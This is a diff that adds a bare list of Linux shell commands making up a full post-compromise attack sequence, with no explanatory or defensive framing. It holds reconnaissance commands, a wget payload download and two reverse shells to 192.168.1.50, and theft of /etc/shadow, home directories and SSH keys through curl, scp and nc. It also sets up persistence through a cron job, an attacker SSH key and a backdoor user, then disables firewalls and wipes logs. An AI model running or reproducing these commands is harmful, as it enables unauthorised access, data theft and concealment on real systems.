@@ -1,0 +1,39 @@
+ls -la
+cd /tmp
+whoami
+id
+uname -a
+cat /etc/passwd
+cat /etc/shadow
+ifconfig
+ip addr show
+netstat -tulnp
+ps aux
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+nmap -sV -p 1-65535 10.0.0.0/24
+wget http://192.168.1.50:8080/payload.sh -O /tmp/payload.sh
+chmod +x /tmp/payload.sh
+bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+curl -X POST -d @/etc/shadow http://192.168.1.50:8080/exfil
+scp /etc/passwd deploy@192.168.1.50:/tmp/loot/
+tar czf /tmp/data.tar.gz /home /etc/ssh /root/.ssh
+base64 /tmp/data.tar.gz > /tmp/data.b64
+nc 192.168.1.50 9999 < /tmp/data.b64
+echo "* * * * * /tmp/payload.sh" | crontab -
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+useradd -m -s /bin/bash backdoor
+echo "backdoor:password123" | chpasswd
+iptables -F
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+history -c
+shred -zu /var/log/auth.log
+rm -rf /var/log/syslog.1
+> /var/log/wtmp
+ls -la /var/log/
+systemctl stop firewalld
+ufw disable
